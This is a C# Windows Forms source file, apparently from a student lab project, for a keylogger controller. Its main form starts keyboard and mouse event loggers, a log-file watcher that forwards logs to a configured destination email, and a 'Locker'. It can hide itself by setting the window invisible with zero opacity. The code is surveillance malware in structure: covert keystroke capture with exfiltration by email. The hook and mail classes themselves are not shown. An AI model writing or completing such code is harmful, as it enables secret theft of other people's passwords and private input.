using System;
using System.Windows.Forms;

namespace lab8
{
    public partial class Form1 : Form
    {
        private KeyBoardEventsLogger _keyBoardLogger;
        private MouseEventsLogger _mouseLogger;
        private Settings _settings;

        private Locker locker;


        private const string LogsDirrectory = @"D:/lab8/Logs/";
        private const string SettingsFullPath = @"D:/lab8/Settings.txt";
        private LogFilesRenameWatcher _watcher;

        public Form1() => InitializeComponent();

        private void Form1_Load(object sender, EventArgs e)
        {
            _settings = new Settings(SettingsFullPath);

            _keyBoardLogger = new KeyBoardEventsLogger
            {
                EventTextBox = textBox1,
                TimeTextBox = textBox2,
                DirrPath = LogsDirrectory,
                MaxFileSize = _settings.MaxFileSize,
                DestinationEmail = _settings.DestinationEmail
            };

            _mouseLogger = new MouseEventsLogger
            {
                EventTextBox = textBox1,
                TimeTextBox = textBox2,
                DirrPath = LogsDirrectory,
                MaxFileSize = _settings.MaxFileSize,
                DestinationEmail = _settings.DestinationEmail
            };

            _watcher = new LogFilesRenameWatcher
            {
                DirrectoryPath = LogsDirrectory,
                DestinationAddress = _settings.DestinationEmail
            };

            UpdateSettings();

            _keyBoardLogger.StartLogger(this);
            _mouseLogger.StartLogger();
            _watcher.StartWatcher();
            locker = new Locker();
            locker.StartLocker();
        }

        private void Form1_Shown(object sender, EventArgs e) => IsVisible = _settings.StartInNormalMode;

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            _keyBoardLogger.StopLogger();
            _mouseLogger.StopLogger();
            _watcher.StopWatcher();
            locker.StopLocker();
        }

        public bool IsVisible
        {
            get => Visible;
            set
            {
                Visible = value;
                Opacity = value ? 1 : 0;
            }
        }

        private void SaveSettingsButton_Click(object sender, EventArgs e)
        {
            if (!_settings.ChangeSettings(emailTextBox.Text, maxSizeTextBox.Text, normalStartCheckBox.Checked))
            {
                MessageBox.Show(@"Illegal data!");
            }
            else
            {
                MessageBox.Show(@"Saved!");
            }
            UpdateSettings();

            locker.StartLocker();
        }

        private void UpdateSettings()
        {
            emailTextBox.Text = _settings.DestinationEmail;
            maxSizeTextBox.Text = _settings.MaxFileSize.ToString();
            normalStartCheckBox.Checked = _settings.StartInNormalMode;
        }
    }
}
